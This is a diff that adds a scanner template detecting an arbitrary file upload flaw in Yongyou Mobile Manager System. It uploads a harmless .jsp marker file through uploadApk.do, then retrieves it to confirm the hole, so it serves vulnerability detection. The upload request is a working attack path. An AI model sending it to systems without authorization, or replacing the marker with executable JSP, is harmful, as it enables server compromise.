@@ -1,0 +1,36 @@
+id: yongyou-mobile-manager-system-uploadapk-upload
+info:
+  name: Yongyou Mobile Manager System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /maportal/appmanager/uploadApk.dopk_obj= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=fa48ebfef59b133a8cd5275661b35d2c
+
+        --fa48ebfef59b133a8cd5275661b35d2c
+        Content-Disposition: form-data; name="downloadpath"; filename="{{filename}}.jsp"
+        Content-Type: application/msword
+
+        vulnerability
+        --fa48ebfef59b133a8cd5275661b35d2c--
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '{"status":2}')
+
+  - raw:
+      - |
+        GET /maupload/apk/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'vulnerability')
+variables:
+  filename: '{{to_lower(rand_base(6))}}'
